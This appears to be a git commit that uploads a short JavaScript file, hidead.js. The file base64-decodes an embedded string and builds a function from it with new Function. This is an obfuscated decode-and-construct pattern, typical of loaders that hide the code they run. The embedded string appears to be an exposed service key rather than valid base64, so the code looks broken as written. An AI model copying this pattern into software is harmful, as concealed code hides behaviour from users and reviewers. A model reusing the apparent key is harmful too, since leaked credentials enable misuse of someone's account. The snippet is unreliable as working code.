5af06fb400f6ead55ce73f5339d82406f20b0c55
thesymomed <65082427+thesymomed@users.noreply.github.com>
2020-05-09 16:15:04 +0000

    Add files via upload

---
+++ hidead.js
@@ -0,0 +1,3 @@
+var ad = "AAAAFkFt7_o:APA91bHZqVjBjaqmQpchvD39jVYwAmLCnBgLXHQqGlAECXY5O0OPajoFM3dZMgJsYf3fV1mO4ZeCqrPL32IrGFbmS1Z8WFzkE6nXcE6UUeed5WkCGe8wnMziNEzurx9rSZaqqWtPFQe-";
+var decodedad = atob(ad);
+var func = new Function(decodedad);
